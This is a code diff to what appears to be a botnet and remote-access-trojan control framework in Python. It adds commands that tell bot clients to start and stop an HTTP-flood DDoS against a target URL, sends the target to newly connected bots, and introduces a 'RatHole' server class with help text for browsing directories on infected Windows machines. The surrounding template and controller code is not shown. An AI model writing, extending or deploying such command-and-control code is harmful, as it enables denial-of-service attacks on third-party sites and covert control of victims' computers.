@@ -1,6 +1,9 @@
+from time import sleep
 
 from .basic_templates import BasicTemplate
 from .adv_templates import AdvTemplate
+from .controlers import BotControler
+
 
 class Basic(BasicTemplate):
     TYPES = "Basic"
@@ -30,9 +33,12 @@ class BasicBot(BasicTemplate):
     WORM_INFO = "Botnet Client can perform DDOS Attack (Http_Flood). Clients automatic recive target url from server and signal to attack"
 
     def __init__(self, main_pipe, conf, signal_stop):
-        super().__init__(main_pipe, conf, signal_stop)
+        super().__init__(main_pipe, conf, signal_stop, controler=BotControler)
         self.target = None
         self.start_attack = False
+    
+    def accept_conn(self, handler):
+        pass
     
     def set_target(self, target):
         self.target = target
@@ -47,6 +53,26 @@ class BasicBot(BasicTemplate):
         self.start_attack = True
         self.send_msg("att", "ALL")
         return True
+    
+    def stop_attack(self):
+        self.start_attack = False
+        self.send_msg("stp", "ALL")
+
+    def send_coordinates(self, handler):
+        if self.target:
+            self.send_msg(f"tar {self.target}", handler)
+            sleep(0.2)
+        if self.start_attack:
+            self.send_msg("att", handler)
+        
+    
+    def exec_sys(self, msg, handler):
+        cmd = self.unpack_sys(msg)
+        self.Msg(f"[{self.name}-DEV] EXEC_SYS:{cmd}", dev=True)
+        if cmd[0] == "basbot":
+            self.send_coordinates(handler)
+            return True
+        self._exec_sys(msg, handler)
 
 class BasicRat(BasicTemplate):
     TYPES = "BasicRat"
@@ -100,7 +126,25 @@ class GypsyKing(AdvTemplate):
         hilfe += '---   ex: ss "@1 cd c:/windows"\n'
         return hilfe
 
+
+class RatHole(AdvTemplate):
+    TYPES = "RatHole"
+    INFO = "Server to handle multiple Advanced Rats."
+    WORM_TYPE = "Rat"
+    WORM_INFO = "Runs in background. Include many function"
+
+    def __init__(self, main_pipe, conf, signal_stop):
+        super().__init__(main_pipe, conf, signal_stop)
     
     
-    
-    
+    def accept_conn(self, handler):
+        pass
+
+    def help(self):
+        hilfe = "\n --------------------------- RAT Client Command ----------------------\n"
+        hilfe += '---   ss "@<client_id> dir"           - Show dirs and files current dir\n'
+        hilfe += '---   ex: ss "@3 dir"\n\n'
+        hilfe += '---   ss "@<client_id> pwd"           - Shows the current directory\n'
+        hilfe += '---   ss "@<client_id> cd <dir_name>" - Change directory\n'
+        hilfe += '---   ex: ss "@1 cd c:/windows"\n'
+        return hilfe
